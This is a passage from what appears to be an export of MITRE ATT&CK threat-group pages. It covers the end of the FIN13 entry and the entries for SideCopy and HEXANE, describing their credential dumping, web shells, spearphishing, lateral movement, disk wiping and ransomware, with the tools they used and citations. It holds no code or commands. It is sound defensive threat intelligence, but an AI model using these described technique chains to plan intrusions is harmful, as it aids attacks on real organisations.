Victim Network Information: Network Topology FIN13 has searched for infrastructure that can provide remote access to an environment for targeting efforts.[1] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories FIN13 has created hidden files and folders within a compromised Linux system /tmp directory. FIN13 also has used attrib.exe to hide gathered local host information.[1][2] Enterprise T1574 .001 Hijack Execution Flow: DLL FIN13 has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507).[2] Enterprise T1105 Ingress Tool Transfer FIN13 has downloaded additional tools and malware to compromised systems.[1][2] Enterprise T1056 .001 Input Capture: Keylogging FIN13 has logged the keystrokes of victims to escalate privileges.[1] Enterprise T1036 Masquerading FIN13 has masqueraded staged data by using the Windows certutil utility to generate fake Base64 encoded certificates with the input file.[1][2] .004 Masquerade Task or Service FIN13 has used scheduled tasks names such as acrotyr and AppServicesr to mimic the same names in a compromised network's C:\\Windows directory.[1] .005 Match Legitimate Resource Name or Location FIN13 has masqueraded WAR files to look like legitimate packages such as, wsexample.war, wsexamples.com, examples.war, and exampl3s.war.[2] Enterprise T1556 Modify Authentication Process FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.[1] Enterprise T1046 Network Service Discovery FIN13 has utilized nmap for reconnaissance efforts. FIN13 has also scanned for internal MS-SQL servers in a compromised network.[1][2] Enterprise T1135 Network Share Discovery FIN13 has executed net view commands for enumeration of open shares on compromised machines.[1][2] Enterprise T1588 .002 Obtain Capabilities: Tool FIN13 has utilized publicly available tools such as Mimikatz, Impacket, PWdump7, ProcDump, Nmap, and Incognito V2 for targeting efforts.[2] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory FIN13 has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory with Mimikatz.[1][2] .002 OS Credential Dumping: Security Account Manager FIN13 has extracted the SAM and SYSTEM registry hives using the reg.exe binary for obtaining password hashes from a compromised machine.[2] .003 OS Credential Dumping: NTDS FIN13 has harvested the NTDS.DIT file and leveraged the Impacket tool on the compromised domain controller to locally decrypt it.[2] Enterprise T1069 Permission Groups Discovery FIN13 has enumerated all users and roles from a victim's main treasury system.[1] Enterprise T1572 Protocol Tunneling FIN13 has utilized web shells and Java tools for tunneling capabilities to and from compromised assets.[2] Enterprise T1090 .001 Proxy: Internal Proxy FIN13 has utilized a proxy tool to communicate between compromised assets.[2] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol FIN13 has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement.[1] .002 Remote Services: SMB/Windows Admin Shares FIN13 has leveraged SMB to move laterally within a compromised network via application servers and SQL servers.[2] .004 Remote Services: SSH FIN13 has remotely accessed compromised environments via secure shell (SSH) for lateral movement.[1] .006 Remote Services: Windows Remote Management FIN13 has leveraged WMI to move laterally within a compromised network via application servers and SQL servers.[2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task FIN13 has created scheduled tasks in the C:\\Windows directory of the compromised network.[1] Enterprise T1505 .003 Server Software Component: Web Shell FIN13 has utilized obfuscated and open-source web shells such as JspSpy, reGeorg, MiniWebCmdShell, and Vonloesch Jsp File Browser 1.2 to enable remote code execution and to execute commands on compromised web server.[2] Enterprise T1082 System Information Discovery FIN13 has collected local host information by utilizing Windows commands systeminfo, fsutil, and fsinfo. FIN13 has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information.[1][2] Enterprise T1016 System Network Configuration Discovery FIN13 has used nslookup and ipconfig for network reconnaissance efforts. FIN13 has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information.[1][2] .001 Internet Connection Discovery FIN13 has used Ping and tracert for network reconnaissance efforts.[1] Enterprise T1049 System Network Connections Discovery FIN13 has used netstat and other net commands for network reconnaissance efforts.[1] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files FIN13 has obtained administrative credentials by browsing through local files on a compromised machine.[2] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash FIN13 has used the PowerShell utility Invoke-SMBExec to execute the pass the hash method for lateral movement within an compromised environment.[1] Enterprise T1078 .001 Valid Accounts: Default Accounts FIN13 has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access.[2] Enterprise T1047 Windows Management Instrumentation FIN13 has utilized WMI to execute commands and move laterally on compromised Windows machines.[1][2] Software ID Name References Techniques S0160 certutil [2] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0363 Empire [2] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0357 Impacket [2] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket References Ta, V., et al. (2022, August 8). FIN13: A Cybercriminal Threat Actor Focused on Mexico. Retrieved February 9, 2023. Sygnia Incident Response Team. (2022, January 5). TG2003: ELEPHANT BEETLE UNCOVERING AN ORGANIZED FINANCIAL-THEFT OPERATION. Retrieved February 9, 2023. "
},
{
"id": 200,
"title": "SideCopy, Group G1008",
"path": "/groups/G1008/index.html",
"content": " SideCopy SideCopy is a Pakistani threat group that has primarily targeted South Asian countries, including Indian and Afghani government personnel, since at least 2019. SideCopy's name comes from its infection chain that tries to mimic that of Sidewinder, a suspected Indian threat group.[1] ID: G1008 Contributors: Pooja Natarajan, NEC Corporation India; Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India Version: 1.0 Created: 07 August 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic SideCopy has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling mshta.exe.[1] Enterprise T1584 .001 Compromise Infrastructure: Domains SideCopy has compromised domains for some of their infrastructure, including for C2 and staging malware.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL SideCopy has used a malicious loader DLL file to execute the credwiz.exe process and side-load the malicious payload Duser.dll.[1] Enterprise T1105 Ingress Tool Transfer SideCopy has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location SideCopy has used a legitimate DLL file name, Duser.dll to disguise a malicious remote access tool.[1] Enterprise T1106 Native API SideCopy has executed malware by calling the API function CreateProcessW.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment SideCopy has sent spearphishing emails with malicious hta file attachments.[1] Enterprise T1598 .002 Phishing for Information: Spearphishing Attachment SideCopy has crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts.[1] Enterprise T1518 Software Discovery SideCopy has collected browser information from a compromised host.[1] .001 Security Software Discovery SideCopy uses a loader DLL file to collect AV product names from an infected host.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware SideCopy has used compromised domains to host its malicious payloads.[1] Enterprise T1218 .005 System Binary Proxy Execution: Mshta SideCopy has utilized mshta.exe to execute a malicious hta file.[1] Enterprise T1082 System Information Discovery SideCopy has identified the OS version of a compromised host.[1] Enterprise T1614 System Location Discovery SideCopy has identified the country location of a compromised host.[1] Enterprise T1016 System Network Configuration Discovery SideCopy has identified the IP address of a compromised host.[1] Enterprise T1204 .002 User Execution: Malicious File SideCopy has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.[1] Software ID Name Techniques S1028 Action RAT Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Deobfuscate/Decode Files or Information, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Windows Management Instrumentation S1029 AuTo Stealer Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, Non-Application Layer Protocol, Software Discovery: Security Software Discovery, System Information Discovery, System Owner/User Discovery References Threat Intelligence Team. (2021, December 2). SideCopy APT: Connecting lures victims, payloads to infrastructure. Retrieved June 13, 2022. "
},
{
"id": 201,
"title": "HEXANE, Lyceum, Siamesekitten, Spirlin, Group G1001",
"path": "/groups/G1001/index.html",
"content": " HEXANE HEXANE is a cyber espionage threat group that has targeted oil & gas, telecommunications, aviation, and internet service provider organizations since at least 2017. Targeted companies have been located in the Middle East and Africa, including Israel, Saudi Arabia, Kuwait, Morocco, and Tunisia. HEXANE's TTPs appear similar to APT33 and OilRig but due to differences in victims and tools it is tracked as a separate entity.[1][2][3][4] ID: G1001 \u24d8 Associated Groups: Lyceum, Siamesekitten, Spirlin Contributors: Dragos Threat Intelligence; Mindaugas Gudzis, BT Security Version: 2.3 Created: 17 October 2018 Last Modified: 14 August 2024 Version Permalink Live Version Associated Group Descriptions Name Description Lyceum [5] Siamesekitten [3] Spirlin [4] Campaigns ID Name First Seen Last Seen References Techniques C0038 HomeLand Justice May 2021 [6][7][8] September 2022 [8] HEXANE probed victim infrastructure in support of HomeLand Justice.[7] Access Token Manipulation: Token Impersonation/Theft, Account Discovery: Email Account, Account Manipulation: Additional Email Delegate Permissions, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encrypted for Impact, Disk Wipe: Disk Structure Wipe, Email Collection: Remote Email Collection, Exfiltration Over C2 Channel, Exploit Public-Facing Application, Impair Defenses: Disable or Modify Tools, Impair Defenses: Disable Windows Event Logging, Ingress Tool Transfer, Lateral Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Network Service Discovery, Obtain Capabilities: Code Signing Certificates, Obtain Capabilities: Tool, OS Credential Dumping: LSASS Memory, Remote Services: Remote Desktop Protocol, Remote Services: SMB/Windows Admin Shares, Server Software Component: Web Shell, Valid Accounts: Default Accounts, Valid Accounts, Windows Management Instrumentation Techniques Used Domain ID Name Use Enterprise T1134 .001 Access Token Manipulation: Token Impersonation/Theft During HomeLand Justice, threat actors used custom tooling to acquire tokens using ImpersonateLoggedOnUser/SetThreadToken.[7] Enterprise T1087 .003 Account Discovery: Email Account During HomeLand Justice, threat actors used compromised Exchange accounts to search mailboxes for administrator accounts.[8] Enterprise T1098 .002 Account Manipulation: Additional Email Delegate Permissions During HomeLand Justice, threat actors added the ApplicationImpersonation management role to accounts under their control to impersonate users and take ownership of targeted mailboxes.[7] Enterprise T1583 .001 Acquire Infrastructure: Domains HEXANE has registered and operated domains for campaigns, often using a security or web technology theme or impersonating the targeted organization.[5][1][3] .002 Acquire Infrastructure: DNS Server HEXANE has set up custom DNS servers to send commands to compromised hosts via TXT records.[9] Enterprise T1010 Application Window Discovery HEXANE has used a PowerShell-based keylogging tool to capture the window title.[5] Enterprise T1110 Brute Force HEXANE has used brute force attacks to compromise valid credentials.[5] .003 Password Spraying HEXANE has used password spraying attacks to obtain valid credentials.[5] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell HEXANE has used PowerShell-based tools and scripts for discovery and collection on compromised hosts.[5][10][2] During HomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery.[8][7] .003 Command and Scripting Interpreter: Windows Command Shell During HomeLand Justice, threat actors used Windows batch files for persistence and execution.[8][7] .005 Command and Scripting Interpreter: Visual Basic HEXANE has used a VisualBasic script named MicrosoftUpdator.vbs for execution of a PowerShell keylogger.[2] Enterprise T1586 .002 Compromise Accounts: Email Accounts HEXANE has used compromised accounts to send spearphishing emails.[5] Enterprise T1555 Credentials from Password Stores HEXANE has run cmdkey on victim machines to identify stored credentials.[2] .003 Credentials from Web Browsers HEXANE has used a Mimikatz-based tool and a PowerShell script to steal passwords from Google Chrome.[2] Enterprise T1486 Data Encrypted for Impact During HomeLand Justice, threat actors used ROADSWEEP ransomware to encrypt files on targeted systems.[6][8][7] Enterprise T1561 .002 Disk Wipe: Disk Structure Wipe During HomeLand Justice, threat actors used a version of ZeroCleare to wipe disk drives on targeted hosts.[8][7] Enterprise T1114 .002 Email Collection: Remote Email Collection During HomeLand Justice, threat actors made multiple HTTP POST requests to the Exchange servers of the victim organization to transfer data.[8] Enterprise T1585 .001 Establish Accounts: Social Media Accounts HEXANE has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers.[3] .002 Establish Accounts: Email Accounts HEXANE has established email accounts for use in domain registration including for ProtonMail addresses.[2] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription HEXANE has used WMI event subscriptions for persistence.[2] Enterprise T1041 Exfiltration Over C2 Channel During HomeLand Justice, threat actors used HTTP to transfer data from compromised Exchange servers.[8] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage HEXANE has used cloud services, including OneDrive, for data exfiltration.[11] Enterprise T1190 Exploit Public-Facing Application For HomeLand Justice, threat actors exploited CVE-2019-0604 in Microsoft SharePoint for initial access.[8] Enterprise T1589 Gather Victim Identity Information HEXANE has identified specific potential victims at targeted organizations.[3] .002 Email Addresses HEXANE has targeted executives, human resources staff, and IT personnel for spearphishing.[5][3] Enterprise T1591 .004 Gather Victim Org Information: Identify Roles HEXANE has identified executives, HR, and IT staff at victim organizations for further targeting.[5][3] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During HomeLand Justice, threat actors modified and disabled components of endpoint detection and response (EDR) solutions including Microsoft Defender Antivirus.[7] .002 Impair Defenses: Disable Windows Event Logging During HomeLand Justice, threat actors deleted Windows events and application logs.[7] Enterprise T1105 Ingress Tool Transfer HEXANE has downloaded additional payloads and malicious scripts onto a compromised host.[2] During HomeLand Justice, threat actors used web shells to download files to compromised infrastructure.[7] Enterprise T1056 .001 Input Capture: Keylogging HEXANE has used a PowerShell-based keylogger named kl.ps1.[5][2] Enterprise T1534 Internal Spearphishing HEXANE has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access.[5] Enterprise T1570 Lateral Tool Transfer During HomeLand Justice, threat actors initiated a process named Mellona.exe to spread the ROADSWEEP file encryptor and a persistence script to a list of internal machines.[8] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location During HomeLand Justice, threat actors renamed ROADSWEEP to GoXML.exe and ZeroCleare to cl.exe.[8][6] Enterprise T1046 Network Service Discovery During HomeLand Justice, threat actors executed the Advanced Port Scanner tool on compromised systems.[8][7] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation HEXANE has used Base64-encoded scripts.[2] Enterprise T1588 .002 Obtain Capabilities: Tool HEXANE has acquired, and sometimes customized, open source tools such as Mimikatz, Empire, VNC remote access software, and DIG.net.[2][5][9] During HomeLand Justice, threat actors used tools including Advanced Port Scanner, Mimikatz, and Impacket.[8][7] .003 Obtain Capabilities: Code Signing Certificates During HomeLand Justice, threat actors used tools with legitimate code signing certificates. [8] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory During HomeLand Justice, threat actors dumped LSASS memory on compromised hosts.[8] Enterprise T1069 .001 Permission Groups Discovery: Local Groups HEXANE has run net localgroup to enumerate local groups.[2] Enterprise T1057 Process Discovery HEXANE has enumerated processes on targeted systems.[2] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol HEXANE has used remote desktop sessions for lateral movement.[5] During HomeLand Justice, threat actors primarily used RDP for lateral movement in the victim environment.[8][7] .002 Remote Services: SMB/Windows Admin Shares During HomeLand Justice, threat actors used SMB for lateral movement.[8][7] Enterprise T1018 Remote System Discovery HEXANE has used net view to enumerate domain machines.[2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task HEXANE has used a scheduled task to establish persistence for a keylogger.[2] Enterprise T1505 .003 Server Software Component: Web Shell For HomeLand Justice, threat actors used .aspx webshells named pickers.aspx, error4.aspx, and ClientBin.aspx, to maintain persistence.[8][7] Enterprise T1518 Software Discovery HEXANE has enumerated programs installed on an infected machine.[2] Enterprise T1608 .001 Stage Capabilities: Upload Malware HEXANE has staged malware on fraudulent websites set up to impersonate targeted organizations.[3] Enterprise T1082 System Information Discovery HEXANE has collected the hostname of a compromised machine.[2] Enterprise T1016 System Network Configuration Discovery HEXANE has used Ping and tracert for network discovery.[2] .001 Internet Connection Discovery HEXANE has used tools including BITSAdmin to test internet connectivity from compromised hosts.[2] Enterprise T1049 System Network Connections Discovery HEXANE has used netstat to monitor connections to specific ports.[2] Enterprise T1033 System Owner/User Discovery HEXANE has run whoami on compromised machines to identify the current user.[2] Enterprise T1204 .002 User Execution: Malicious File HEXANE has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware.[5][1][3][9] Enterprise T1078 .001 Valid Accounts: Default Accounts During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket.[7] Enterprise T1102 .002 Web Service: Bidirectional Communication HEXANE has used cloud services, including OneDrive, for C2.[11] Enterprise T1047 Windows Management Instrumentation During HomeLand Justice, threat actors used WMI to modify Windows Defender settings.[7] Software ID Name References Techniques S0190 BITSAdmin [2] BITS Jobs, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S1149 CHIMNEYSWEEP [6] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Clipboard Data, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Data Encoding: Non-Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Execution Guardrails, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Obfuscated Files or Information, Obfuscated Files or Information: Embedded Payloads, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information: Dynamic API Resolution, Peripheral Device Discovery, Process Discovery, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: CMSTP, System Owner/User Discovery, System Shutdown/Reboot, Web Service S1014 DanBot [5] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Deobfuscate/Decode Files or Information, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Phishing: Spearphishing Attachment, Remote Services: VNC, Scheduled Task/Job: Scheduled Task, User Execution: Malicious File S1021 DnsSystem [9] Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Exfiltration Over C2 Channel, Ingress Tool Transfer, System Owner/User Discovery, User Execution: Malicious File S0363 Empire [5] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0095 ftp [8] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0357 Impacket [7] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0100 ipconfig [3][9] System Network Configuration Discovery S1020 Kevin [2] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Junk Data, Data Staged, Data Transfer Size Limits, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exfiltration Over C2 Channel, Fallback Channels, Hide Artifacts: Hidden Window, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Rename Legitimate Utilities, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Protocol Tunneling, System Information Discovery, System Network Configuration Discovery, Virtualization/Sandbox Evasion S1015 Milan [2][4] Account Discovery: Local Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Data Staged: Local Data Staging, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal: File Deletion, Ingress Tool Transfer, Inter-Process Communication: Component Object Model, Masquerading, Masquerading: Double File Extension, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Protocol Tunneling, Query Registry, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S0002 Mimikatz [2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0104 netstat [2] System Network Connections Discovery S0097 Ping [3] Remote System Discovery S0378 PoshC2 [5] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Create Process with Token, Access Token Manipulation, Account Discovery: Local Account, Account Discovery: Domain Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Automated Collection, Brute Force, Credentials from Password Stores, Domain Trust Discovery, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Input Capture: Keylogging, Network Service Discovery, Network Sniffing, OS Credential Dumping: LSASS Memory, Password Policy Discovery, Permission Groups Discovery: Local Groups, Process Injection, Proxy, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Unsecured Credentials: Credentials In Files, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0364 RawDisk [8][7] Data Destruction, Disk Wipe: Disk Structure Wipe, Disk Wipe: Disk Content Wipe S1150 ROADSWEEP [6] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, Defacement: Internal Defacement, Deobfuscate/Decode Files or Information, Execution Guardrails, File and Directory Discovery, Indicator Removal: File Deletion, Inhibit System Recovery, Inter-Process Communication, Obfuscated Files or Information: Encrypted/Encoded File, Peripheral Device Discovery, Service Stop, Subvert Trust Controls: Code Signing, System Information Discovery S1019 Shark [2][4] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Data Staged, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Exfiltration Over C2 Channel, Fallback Channels, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Query Registry, Scheduled Transfer, System Information Discovery, Virtualization/Sandbox Evasion: System Checks S1151 ZeroCleare [8][7] Command and Scripting Interpreter, Command and Scripting Interpreter: PowerShell, Disk Wipe: Disk Structure Wipe, Exploitation for Privilege Escalation, Indicator Removal: File Deletion, Native API, Subvert Trust Controls: Code Signing, System Information Discovery References Dragos. (n.d.). Hexane. Retrieved October 27, 2019. Kayal, A. et al. (2021, October). LYCEUM REBORN: COUNTERINTELLIGENCE IN THE MIDDLE EAST. Retrieved June 14, 2022. ClearSky Cyber Security . (2021, August). New Iranian Espionage Campaign By \u201cSiamesekitten\u201d - Lyceum. Retrieved June 6, 2022. Accenture. (2021, November 9). Who are latest targets of cyber group Lyceum?. Retrieved June 16, 2022. SecureWorks 2019, August 27 LYCEUM Takes Center Stage in Middle East Campaign Retrieved. 2019/11/19 Jenkins, L. at al. (2022, August 4). ROADSWEEP Ransomware - Likely Iranian Threat Actor Conducts Politically Motivated Disruptive Activity Against Albanian Government Organizations. Retrieved August 6, 2024. MSTIC. (2022, September 8). Microsoft investigates Iranian attacks against the Albanian government. Retrieved August 6, 2024. CISA. (2022, September 23). AA22-264A Iranian State Actors Conduct Cyber Operations Against the Government of Albania. Retrieved August 6, 2024. Shivtarkar, N. and Kumar, A. 